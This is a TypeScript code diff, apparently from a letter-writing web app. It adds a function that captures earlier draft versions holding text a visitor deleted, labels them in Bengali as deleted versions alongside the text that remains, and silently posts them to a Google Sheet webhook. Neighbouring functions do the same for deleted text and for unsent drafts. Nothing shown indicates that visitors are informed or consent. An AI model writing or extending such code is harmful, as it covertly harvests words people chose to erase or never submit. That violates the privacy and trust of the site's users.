@@ -307,6 +307,30 @@ export function recordDeletedChithiText(deletedText: string, device?: string): v
   }).catch(() => {});
 }
 
+// Send previous draft version containing deleted content to Google Sheet
+export function recordDeletedChithiVersion(
+  deletedVersionText: string,
+  versionIndex: number = 1,
+  currentRemainingText?: string,
+  device?: string
+): void {
+  const trimmed = deletedVersionText.trim();
+  if (!trimmed || trimmed.length < 3) return;
+  const webhookUrl = getEffectiveGoogleSheetWebhookUrl();
+  if (!webhookUrl) return;
+
+  const versionTag = versionIndex > 1 ? `[ডিলেট করা ভার্সন ${versionIndex}]` : '[ডিলেট করা ভার্সন]';
+  const remainingInfo = currentRemainingText && currentRemainingText.trim()
+    ? `\n\n(কাটছাঁটের পর অবশিষ্ট রাখা অংশ: "${currentRemainingText.trim()}")`
+    : '';
+
+  sendChithiEventToGoogleSheet(webhookUrl, {
+    letterId: 'chithi-ver-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
+    content: `${versionTag} ${trimmed}${remainingInfo}`,
+    device: device || detectUserDevice(),
+  }).catch(() => {});
+}
+
 // Send unsent draft (when visitor leaves without submitting) to Google Sheet
 export function recordUnsentChithiDraft(draftText: string, device?: string): void {
   const trimmed = draftText.trim();
